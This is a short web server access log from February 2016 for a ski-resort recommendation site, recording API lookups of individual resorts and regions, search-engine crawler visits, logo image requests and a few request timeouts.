170.75.162.130 - - [17/Feb/2016:16:17:39 -0800] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:16:20:30 -0800] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 988 "-" "node-superagent/1.4.0"
170.75.162.130 - - [17/Feb/2016:16:21:00 -0800] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 931 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:16:32:51 -0800] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 983 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:16:34:11 -0800] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1008 "-" "node-superagent/1.4.0"
180.76.15.154 - - [17/Feb/2016:16:34:36 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.11 - - [17/Feb/2016:16:35:34 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.73 - - [17/Feb/2016:16:39:58 -0800] "-" 408 0 "-" "-"
66.249.79.227 - - [17/Feb/2016:16:45:53 -0800] "GET /lib/reccapi.php?fields=t&region=Chile HTTP/1.1" 200 720 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
12.7.131.251 - - [17/Feb/2016:16:50:36 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
52.33.40.213 - - [17/Feb/2016:16:52:23 -0800] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 963 "-" "node-superagent/1.4.0"
52.33.40.213 - - [17/Feb/2016:16:52:53 -0800] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 960 "-" "node-superagent/1.4.0"
66.249.79.227 - - [17/Feb/2016:16:56:13 -0800] "GET /lib/reccapi.php?fields=t&region=East HTTP/1.1" 200 1489 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.7.31.4 - - [17/Feb/2016:17:13:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
24.7.31.4 - - [17/Feb/2016:17:13:48 -0800] "-" 408 0 "-" "-"
52.33.40.213 - - [17/Feb/2016:17:19:44 -0800] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
